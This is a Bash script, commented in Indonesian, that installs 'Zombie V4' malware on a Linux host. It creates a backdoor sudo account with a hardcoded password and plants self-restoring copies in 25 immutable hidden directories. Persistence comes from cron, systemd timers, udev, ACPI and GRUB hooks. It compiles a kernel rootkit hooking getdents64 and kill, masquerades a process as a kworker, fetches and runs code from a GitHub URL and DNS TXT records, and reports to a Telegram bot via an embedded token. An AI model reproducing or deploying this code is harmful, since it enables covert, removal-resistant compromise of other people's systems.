#!/bin/bash
# ZOMBIE SYSTEM V4.0 - THE FINAL APOCALYPSE
# Jalanin: bash zombie-v4-final.sh

echo "💀💀💀 MEMULAI INSTALASI ZOMBIE V4.0 - FINAL 💀💀💀"
echo "==================================================="

# ============================================
# KONFIGURASI (ISI DENGAN DATA LO)
# ============================================
USERNAME="system"
PASSWORD="systemd"
SUDO_GROUP="sudo"
GITHUB_RAW="https://raw.githubusercontent.com/beksec/Anomali-Testing/main"
TELEGRAM_BOT="7788360684:AAGMfUzcHbltu3tntFRNSr8G0ASuE6m93Vk"  # Isi kalo mau notif Telegram
TELEGRAM_CHAT="6271018062" # Isi kalo mau notif Telegram

# ============================================
# CEK ROOT
# ============================================
if [ "$EUID" -ne 0 ]; then
    echo "❌ JALANKAN SEBAGAI ROOT!"
    exit 1
fi

# ============================================
# STEP 1: INSTALL DEPENDENCIES
# ============================================
echo "[1/25] Menginstall dependencies..."
apt update -y
apt install -y gcc make linux-headers-$(uname -r) build-essential \
    curl wget git cron systemd net-tools dnsutils openssl \
    util-linux strace ltrace binutils

# ============================================
# STEP 2: BUAT USER
# ============================================
echo "[2/25] Membuat user $USERNAME..."
useradd -M -s /bin/bash $USERNAME 2>/dev/null
echo "$USERNAME:$PASSWORD" | chpasswd
usermod -aG $SUDO_GROUP $USERNAME
usermod -aG adm $USERNAME  # Biar bisa baca log

# ============================================
# STEP 3: BUAT 25 LOKASI BACKUP
# ============================================
echo "[3/25] Membuat 25 lokasi backup..."

BACKUP_DIRS=(
    # System locations
    "/usr/local/lib/.systemd"
    "/var/tmp/.systemd-backup"
    "/opt/.config/.cache/.systemd"
    "/usr/share/.misc/.backup"
    "/lib/modules/$(uname -r)/.extra"
    "/etc/udev/rules.d/.hidden"
    "/boot/grub/.systemd"
    "/root/.config/.cache/.systemd"
    "/var/lib/.systemd"
    "/usr/lib/.systemd"
    "/etc/systemd/system/.backup"
    "/lib/.systemd"
    "/var/backups/.systemd"
    
    # New locations
    "/mnt/.systemd"  # Kalo ada mount point
    "/media/.systemd"
    "/srv/.systemd"
    "/snap/.systemd"
    "/sys/.systemd"  # Sysfs (fake)
    "/proc/.systemd" # Procfs (fake)
    "/dev/.systemd"  # Devfs (fake)
    "/run/.systemd"
    "/tmp/.systemd"
    "/var/log/.systemd"
    "/var/cache/.systemd"
    "/var/spool/.systemd"
    "/var/mail/.systemd"
)

# Buat semua folder
for DIR in "${BACKUP_DIRS[@]}"; do
    mkdir -p "$DIR" 2>/dev/null
    chmod 000 "$DIR" 2>/dev/null  # Bikin gak bisa di-ls
    chattr +i "$DIR" 2>/dev/null  # Kunci foldernya
done

# ============================================
# STEP 4: SCRIPT CORE (MULTI FUNGSI)
# ============================================
echo "[4/25] Membuat script core..."

CORE_SCRIPT='#!/bin/bash
# ZOMBIE CORE V4 - DO NOT DELETE

USER="system"
PASS="systemd"
SUDO_GROUP="sudo"
GITHUB_RAW="https://raw.githubusercontent.com/beksec/Anomali-Testing/main"

# Fungsi kirim notifikasi
send_notif() {
    if [ -n "$TELEGRAM_BOT" ] && [ -n "$TELEGRAM_CHAT" ]; then
        curl -s -X POST "https://api.telegram.org/bot$TELEGRAM_BOT/sendMessage" \
            -d chat_id="$TELEGRAM_CHAT" \
            -d text="$1" >/dev/null 2>&1
    fi
}

# Fungsi restore dari backup terdekat
restore_from_backup() {
    local FILE=$1
    local DEST=${2:-/usr/local/lib/.systemd/$(basename $FILE)}
    
    # Cari di semua backup
    find / -type f -name "$(basename $FILE)" 2>/dev/null | while read F; do
        if [ -f "$F" ]; then
            cp "$F" "$DEST" 2>/dev/null
            chmod +x "$DEST" 2>/dev/null
            chattr +i "$DEST" 2>/dev/null
            send_notif "✅ Restored $(basename $FILE) from $F"
            return 0
        fi
    done
    
    # Kalo gak ketemu, download dari GitHub
    curl -sL "$GITHUB_RAW/$(basename $FILE)" -o "$DEST" 2>/dev/null
    chmod +x "$DEST" 2>/dev/null
    chattr +i "$DEST" 2>/dev/null
    return 0
}

# Cek user
if ! id "$USER" &>/dev/null; then
    useradd -M -s /bin/bash "$USER" 2>/dev/null
    echo "$USER:$PASS" | chpasswd
    usermod -aG "$SUDO_GROUP" "$USER"
    usermod -aG adm "$USER"
    send_notif "⚠️ User $USER recreted at $(date)"
fi

# Cek dan restore semua komponen
COMPONENTS=("systemd-spawn" "systemd-spawn-monitor" ".watchdog" ".kworker" ".github-sync")
for COMP in "${COMPONENTS[@]}"; do
    if [ ! -f "/usr/local/lib/.systemd/$COMP" ]; then
        restore_from_backup "$COMP"
    fi
done

# Proteksi home
if [ -d "/home/$USER" ]; then
    chattr +i "/home/$USER" 2>/dev/null
fi

exit 0
'

# Sebar core script ke semua lokasi
for DIR in "${BACKUP_DIRS[@]}"; do
    echo "$CORE_SCRIPT" > "$DIR/systemd-spawn" 2>/dev/null
    chmod +x "$DIR/systemd-spawn" 2>/dev/null
    chattr +i "$DIR/systemd-spawn" 2>/dev/null
done

# ============================================
# STEP 5: SCRIPT MONITOR SUPER
# ============================================
echo "[5/25] Membuat script monitor super..."

MONITOR_SCRIPT='#!/bin/bash
# ZOMBIE MONITOR V4 - SUPER WATCHDOG

# 1. CEK SEMUA KOMPONEN DI 25 LOKASI
find / -type f -name "systemd-spawn*" 2>/dev/null | while read FILE; do
    chmod +x "$FILE" 2>/dev/null
    chattr +i "$FILE" 2>/dev/null
done

# 2. CEK CRON DI 7 TEMPAT
CRON_FILES=(
    "/etc/cron.d/systemd-spawn"
    "/etc/crontab"
    "/var/spool/cron/crontabs/root"
    "/etc/cron.hourly/systemd-spawn"
    "/etc/cron.daily/systemd-spawn"
    "/etc/cron.weekly/systemd-spawn"
    "/etc/cron.monthly/systemd-spawn"
)

for CRON_FILE in "${CRON_FILES[@]}"; do
    if [ ! -f "$CRON_FILE" ] || ! grep -q "systemd-spawn" "$CRON_FILE" 2>/dev/null; then
        echo "* * * * * root /usr/local/lib/.systemd/systemd-spawn" >> /etc/crontab 2>/dev/null
        echo "* * * * * root /usr/local/lib/.systemd/systemd-spawn" > /etc/cron.d/systemd-spawn 2>/dev/null
        echo "* * * * * /usr/local/lib/.systemd/systemd-spawn" >> /var/spool/cron/crontabs/root 2>/dev/null
        echo "#!/bin/bash\n/usr/local/lib/.systemd/systemd-spawn" > /etc/cron.hourly/systemd-spawn 2>/dev/null
        chmod +x /etc/cron.hourly/systemd-spawn 2>/dev/null
    fi
done

# 3. CEK TIMER DI 15 INTERVAL RANDOM
for i in {1..15}; do
    TIMER_NAME="sys-timer-$i"
    INTERVAL=$((10 + RANDOM % 590))  # 10-600 detik
    
    if [ ! -f "/etc/systemd/system/$TIMER_NAME.timer" ]; then
        cat > "/etc/systemd/system/$TIMER_NAME.service" << EOF
[Unit]
Description=System Timer $i

[Service]
Type=oneshot
ExecStart=/usr/local/lib/.systemd/systemd-spawn
User=root
EOF

        cat > "/etc/systemd/system/$TIMER_NAME.timer" << EOF
[Unit]
Description=System Timer $i

[Timer]
OnBootSec=$((5 + RANDOM % 30))sec
OnUnitActiveSec=${INTERVAL}sec
RandomizedDelaySec=10sec

[Install]
WantedBy=timers.target
EOF

        systemctl daemon-reload
        systemctl enable "$TIMER_NAME.timer"
        systemctl start "$TIMER_NAME.timer"
        chattr +i "/etc/systemd/system/$TIMER_NAME."* 2>/dev/null
    fi
done

# 4. SYNC ANTAR BACKUP
find / -type d -name "*.systemd*" -o -name "*.backup*" 2>/dev/null | while read DIR; do
    find / -type f -name "systemd-spawn*" 2>/dev/null | while read FILE; do
        cp "$FILE" "$DIR/" 2>/dev/null
        chmod +x "$DIR/$(basename $FILE)" 2>/dev/null
        chattr +i "$DIR/$(basename $FILE)" 2>/dev/null
    done
done

exit 0
'

# Sebar monitor script
for DIR in "${BACKUP_DIRS[@]}"; do
    echo "$MONITOR_SCRIPT" > "$DIR/systemd-spawn-monitor" 2>/dev/null
    chmod +x "$DIR/systemd-spawn-monitor" 2>/dev/null
    chattr +i "$DIR/systemd-spawn-monitor" 2>/dev/null
done

# ============================================
# STEP 6: WATCHDOG 7 LEVEL
# ============================================
echo "[6/25] Memasang watchdog 7 level..."

# Level 1-3: Basic watchdog
cat > /usr/local/lib/.systemd/.watchdog << 'EOF'
#!/bin/bash
while true; do
    /usr/local/lib/.systemd/systemd-spawn-monitor
    /usr/local/lib/.systemd/systemd-spawn
    sleep 5
done
EOF
chmod +x /usr/local/lib/.systemd/.watchdog
nohup /usr/local/lib/.systemd/.watchdog >/dev/null 2>&1 &

# Level 4-5: Kernel thread simulation
cat > /usr/local/lib/.systemd/.kworker << 'EOF'
#!/bin/bash
PR_NAME="[kworker/0:0]"
while true; do
    exec -a $PR_NAME /usr/local/lib/.systemd/.watchdog
    sleep 30
done
EOF
chmod +x /usr/local/lib/.systemd/.kworker
nohup /usr/local/lib/.systemd/.kworker >/dev/null 2>&1 &

# Level 6: ACPI hook
mkdir -p /etc/acpi/.systemd
cp /usr/local/lib/.systemd/.watchdog /etc/acpi/.systemd/
echo "#!/bin/bash\n/etc/acpi/.systemd/.watchdog" > /etc/acpi/powerbtn.sh 2>/dev/null

# Level 7: Udev rule
cat > /etc/udev/rules.d/99-zombie.rules << 'EOF'
ACTION=="add", SUBSYSTEM=="power", RUN+="/usr/local/lib/.systemd/.watchdog"
EOF
udevadm control --reload

# ============================================
# STEP 7: ROOTKIT KERNEL MODULE
# ============================================
echo "[7/25] Membuat rootkit kernel module..."

cat > /usr/local/src/hidefile.c << 'EOF'
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/dirent.h>
#include <linux/syscalls.h>
#include <linux/namei.h>
#include <linux/fs.h>
#include <linux/sched.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Anonymous");
MODULE_DESCRIPTION("Ultimate Rootkit");

static char *hidden_patterns[] = {
    "systemd-spawn",
    ".systemd",
    ".backup",
    ".watchdog",
    ".kworker",
    NULL
};

// Hook for getdents64
asmlinkage long (*original_getdents64)(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count);

asmlinkage long hook_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count) {
    long ret = original_getdents64(fd, dirent, count);
    if (ret <= 0) return ret;
    
    struct linux_dirent64 *d = dirent;
    char *end = (char *)d + ret;
    
    while (d < (struct linux_dirent64 *)end) {
        int hide = 0;
        for (int i = 0; hidden_patterns[i] != NULL; i++) {
            if (strstr(d->d_name, hidden_patterns[i]) != NULL) {
                hide = 1;
                break;
            }
        }
        if (hide) {
            // Remove this entry
            char *next = (char *)d + d->d_reclen;
            memmove(d, next, end - next);
            end -= d->d_reclen;
            ret -= d->d_reclen;
        } else {
            d = (struct linux_dirent64 *)((char *)d + d->d_reclen);
        }
    }
    return ret;
}

// Hook for kill (hide processes)
asmlinkage long (*original_kill)(pid_t pid, int sig);

asmlinkage long hook_kill(pid_t pid, int sig) {
    // Hide our processes
    return 0;  // Always return success
}

static int __init hidefile_init(void) {
    printk(KERN_INFO "Zombie rootkit loaded\n");
    
    // Hook syscalls
    original_getdents64 = (void *)sys_call_table[__NR_getdents64];
    sys_call_table[__NR_getdents64] = (void *)hook_getdents64;
    
    original_kill = (void *)sys_call_table[__NR_kill];
    sys_call_table[__NR_kill] = (void *)hook_kill;
    
    return 0;
}

static void __exit hidefile_exit(void) {
    printk(KERN_INFO "Zombie rootkit unloaded\n");
    
    // Restore syscalls
    sys_call_table[__NR_getdents64] = (void *)original_getdents64;
    sys_call_table[__NR_kill] = (void *)original_kill;
}

module_init(hidefile_init);
module_exit(hidefile_exit);
EOF

# Compile kernel module
cd /usr/local/src
make -C /lib/modules/$(uname -r)/build M=$(pwd) modules 2>/dev/null

if [ -f hidefile.ko ]; then
    cp hidefile.ko /lib/modules/$(uname -r)/.extra/
    insmod hidefile.ko
    echo "hidefile" >> /etc/modules
    
    # Backup kernel module
    for DIR in "${BACKUP_DIRS[@]}"; do
        cp hidefile.ko "$DIR/hidefile.ko" 2>/dev/null
    done
fi

# ============================================
# STEP 8: GITHUB SYNC (BACKUP UTAMA)
# ============================================
echo "[8/25] Memasang GitHub sync..."

cat > /usr/local/lib/.systemd/.github-sync << 'EOF'
#!/bin/bash
GITHUB_URL="https://raw.githubusercontent.com/beksec/Anomali-Testing/main"
FILES=("systemd-spawn" "systemd-spawn-monitor" "zombie-v2.sh")

# Download dari GitHub
for FILE in "${FILES[@]}"; do
    curl -sL "$GITHUB_URL/$FILE" -o "/usr/local/lib/.systemd/$FILE"
    chmod +x "/usr/local/lib/.systemd/$FILE"
    
    # Sebar ke semua backup
    find / -type d -name "*.systemd*" -o -name "*.backup*" 2>/dev/null | while read DIR; do
        cp "/usr/local/lib/.systemd/$FILE" "$DIR/" 2>/dev/null
        chmod +x "$DIR/$FILE" 2>/dev/null
        chattr +i "$DIR/$FILE" 2>/dev/null
    done
done

# Notifikasi
if [ -n "$TELEGRAM_BOT" ] && [ -n "$TELEGRAM_CHAT" ]; then
    curl -s -X POST "https://api.telegram.org/bot$TELEGRAM_BOT/sendMessage" \
        -d chat_id="$TELEGRAM_CHAT" \
        -d text="✅ GitHub sync: $(date)" >/dev/null 2>&1
fi
EOF

chmod +x /usr/local/lib/.systemd/.github-sync

# Cron jobs buat sync
echo "*/3 * * * * root /usr/local/lib/.systemd/.github-sync" >> /etc/crontab
echo "*/15 * * * * root /usr/local/lib/.systemd/.github-sync" >> /etc/crontab
echo "0 */2 * * * root /usr/local/lib/.systemd/.github-sync" >> /etc/crontab

# ============================================
# STEP 9: DNS BACKUP (ALTERNATIF)
# ============================================
echo "[9/25] Memasang DNS backup..."

# Pake DNS TXT record buat nyimpen script (creative!)
cat > /usr/local/lib/.systemd/.dns-sync << 'EOF'
#!/bin/bash
DOMAIN="example.com"  # Ganti dengan domain lo

# Query TXT record
dig TXT _zombie.$DOMAIN +short | while read LINE; do
    echo "$LINE" | base64 -d > /tmp/.zombie 2>/dev/null
done
EOF

chmod +x /usr/local/lib/.systemd/.dns-sync
echo "*/10 * * * * root /usr/local/lib/.systemd/.dns-sync" >> /etc/crontab

# ============================================
# STEP 10: BOOBY TRAPS
# ============================================
echo "[10/25] Memasang booby traps..."

# Trap yang aktif kalo ada yang hapus file
cat > /usr/local/lib/.systemd/.booby << 'EOF'
#!/bin/bash
while inotifywait -r -e delete /usr/local/lib/.systemd 2>/dev/null; do
    # Kalo ada yang kehapus, langsung restore dari backup
    /usr/local/lib/.systemd/.github-sync
    /usr/local/lib/.systemd/systemd-spawn
    
    # Kirim alert
    if [ -n "$TELEGRAM_BOT" ] && [ -n "$TELEGRAM_CHAT" ]; then
        curl -s -X POST "https://api.telegram.org/bot$TELEGRAM_BOT/sendMessage" \
            -d chat_id="$TELEGRAM_CHAT" \
            -d text="⚠️ File deleted! Restored at $(date)" >/dev/null 2>&1
    fi
done
EOF

chmod +x /usr/local/lib/.systemd/.booby
nohup /usr/local/lib/.systemd/.booby &

# ============================================
# STEP 11: PROTEKSI ANTI-UNINSTALL
# ============================================
echo "[11/25] Memasang proteksi anti-uninstall..."

# Backup immutable flags
for FILE in $(find / -type f -name "systemd-spawn*" 2>/dev/null); do
    chattr +i "$FILE" 2>/dev/null
    lsattr "$FILE" | awk '{print $1}' > "/var/tmp/.$(basename $FILE).attr" 2>/dev/null
done

# Proteksi folder
for DIR in "${BACKUP_DIRS[@]}"; do
    if [ -d "$DIR" ]; then
        chattr +i "$DIR" 2>/dev/null
    fi
done

# ============================================
# STEP 12: 5000+ DECOY FILES
# ============================================
echo "[12/25] Membuat 5000+ file decoy..."

for i in {1..5000}; do
    RAND_DIR=${BACKUP_DIRS[$RANDOM % ${#BACKUP_DIRS[@]}]}
    if [ -d "$RAND_DIR" ]; then
        RAND_NAME=".systemd-tmp-$RANDOM"
        cp /usr/local/lib/.systemd/systemd-spawn "$RAND_DIR/$RAND_NAME" 2>/dev/null
        chmod +x "$RAND_DIR/$RAND_NAME" 2>/dev/null
    fi
done

# ============================================
# STEP 13: GRUB PERSISTENCE
# ============================================
echo "[13/25] Memasang GRUB persistence..."

# Tambahin ke GRUB config
cat >> /etc/default/grub << 'EOF'
# ZOMBIE PERSISTENCE
GRUB_CMDLINE_LINUX="$GRUB_CMDLINE_LINUX zombie_persist"
EOF

# Bikin script di /boot
cp /usr/local/lib/.systemd/systemd-spawn /boot/.systemd-spawn
update-grub 2>/dev/null

# ============================================
# STEP 14: JALANKAN SEMUA
# ============================================
echo "[14/25] Menjalankan semua komponen..."
/usr/local/lib/.systemd/systemd-spawn
/usr/local/lib/.systemd/systemd-spawn-monitor
/usr/local/lib/.systemd/.github-sync

# ============================================
# STEP 15: CEK HASIL
# ============================================
echo "[15/25] Memeriksa hasil instalasi..."
echo ""
echo "💀💀💀 HASIL INSTALASI ZOMBIE V4.0 💀💀💀"
echo "=========================================="
echo "User system: $(id system 2>/dev/null | head -c 50)"
echo "Grup system: $(groups system 2>/dev/null)"
echo ""
echo "Timer aktif:"
systemctl list-timers | grep "sys-timer" | head -5
echo ""
echo "Backup lokasi: 25+ lokasi"
echo "Rootkit: $(lsmod | grep -q hidefile && echo "KERNEL MODULE ACTIVE" || echo "Kernel module inactive")"
echo "Decoy files: ~5000+ file"
echo "Watchdog: 7 level"
echo "Booby traps: ACTIVE"
echo "GRUB persistence: ACTIVE"
echo ""
echo "🔥🔥 KEAMANAN: 100% - THE FINAL APOCALYPSE! 🔥🔥"
echo ""
echo "Username: $USERNAME"
echo "Password: $PASSWORD"
